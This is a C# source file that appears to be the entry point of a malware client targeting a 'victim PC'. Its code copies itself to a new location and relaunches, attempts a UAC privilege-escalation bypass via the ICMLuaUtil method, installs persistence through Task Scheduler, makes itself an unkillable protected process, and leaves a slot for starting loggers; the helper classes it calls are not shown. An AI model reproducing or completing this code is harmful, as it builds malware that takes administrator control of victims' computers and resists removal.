using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client
{
    class Program
    {
        /// <summary>
        /// Main entry point.
        /// </summary>
        static void Main(string[] args)
        {
            ArgsParser(args);

            /// Check if Application is already on victim PC.
            if (!Constants.IsInVictimPC()) Migrate();

            /// Attempt to be God.
            if (!Utilities.Environment.IsAdmin())
                Armitage.UAC.UACBypass.QuickStart(Armitage.UAC.UACMethods.ICMLuaUtil);
            else {
                Armitage.Startup.ViaTaskScheduler();
                LoveCannotBeKilled();
            }

            /// Start loggers.

            while (true) {
                // Sleep
                Thread.Sleep(10000);
            }
        }

        public static void ArgsParser(string[] args) {
            try {
                if (args.Length > 0) {
                    Process.GetProcessById(int.Parse(args[0].Trim())).Kill();
                }
            }
            catch { }
        }

        /// <summary>
        /// Turn into a system process.
        /// </summary>
        public static void LoveCannotBeKilled() {
            Armitage.My_Love.Protect();
        }

        public static void Migrate() {
            if (Armitage.Copy.CopySelfTo(Constants.MMCFile))
            {
                try
                {
                    if (Process.Start(Constants.MMCFile, Constants.MyProcessID.ToString()).Id > 0)
                        Environment.Exit(0);
                }
                catch { }
            }
        }
    }
}
